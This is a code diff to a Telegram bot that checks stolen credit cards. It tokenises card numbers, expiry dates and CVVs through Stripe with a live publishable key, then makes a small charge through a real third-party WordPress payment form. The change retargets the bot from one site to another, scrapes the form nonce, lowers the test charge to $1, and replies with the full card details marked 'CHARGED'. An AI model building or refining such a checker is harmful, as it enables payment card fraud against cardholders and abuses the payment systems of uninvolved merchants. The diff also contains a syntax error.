@@ -130,6 +130,7 @@ async def ch(message: types.Message):
     tic = time.perf_counter()
     ID = message.from_user.id
     FIRST = message.from_user.first_name
+    s = requests.Session()
     try:
         await dp.throttle('chk', rate=ANTISPAM)
     except Throttled:
@@ -170,8 +171,8 @@ async def ch(message: types.Message):
 
         # b = session.get('https://ip.seeip.org/', proxies=proxies).text
 
-        s = session.post('https://m.stripe.com/6', headers=headers)
-        r = s.json()
+        m = s.post('https://m.stripe.com/6', headers=headers)
+        r = m.json()
         Guid = r['guid']
         Muid = r['muid']
         Sid = r['sid']
@@ -180,7 +181,7 @@ async def ch(message: types.Message):
             "guid": Guid,
             "muid": Muid,
             "sid": Sid,
-            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
+            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
             "card[name]": Name,
             "card[number]": ccn,
             "card[exp_month]": mm,
@@ -197,19 +198,21 @@ async def ch(message: types.Message):
             "accept-language": "en-US,en;q=0.9"
         }
 
-        pr = session.post('https://api.stripe.com/v1/tokens',
+        pr = s.post('https://api.stripe.com/v1/tokens',
                           data=postdata, headers=HEADER)
         Id = pr.json()['id']
         if pr.status_code != 200:
             return await message.reply("<b>Site is Dead</b>")
-
+        nonce = s.get("https://www.hwstjohn.com/pay-now/")
+        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
         # hmm
         load = {
             "action": "wp_full_stripe_payment_charge",
-            "formName": "BanquetPayment",
+            "formName": "default",
+            "formNonce": form
             "fullstripe_name": Name,
             "fullstripe_email": Email,
-            "fullstripe_custom_amount": "25.0",
+            "fullstripe_custom_amount": "1",
             "fullstripe_amount_index": 0,
             "stripeToken": Id
         }
@@ -218,12 +221,10 @@ async def ch(message: types.Message):
             "accept": "application/json, text/javascript, */*; q=0.01",
             "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
             "user-agent": UA,
-            "origin": "https://archiro.org",
-            "referer": "https://archiro.org/banquet/",
             "accept-language": "en-US,en;q=0.9"
         }
 
-        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
+        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
                           data=load, headers=header)
         msg = rx.json()['msg']
 
@@ -232,7 +233,7 @@ async def ch(message: types.Message):
         if 'true' in rx.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
-<b>STATUS</b>➟ #CHARGED 25$
+<b>STATUS</b>➟ #CHARGED 1$
 <b>MSG</b>➟ {msg}
 <b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
 <b>CHKBY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
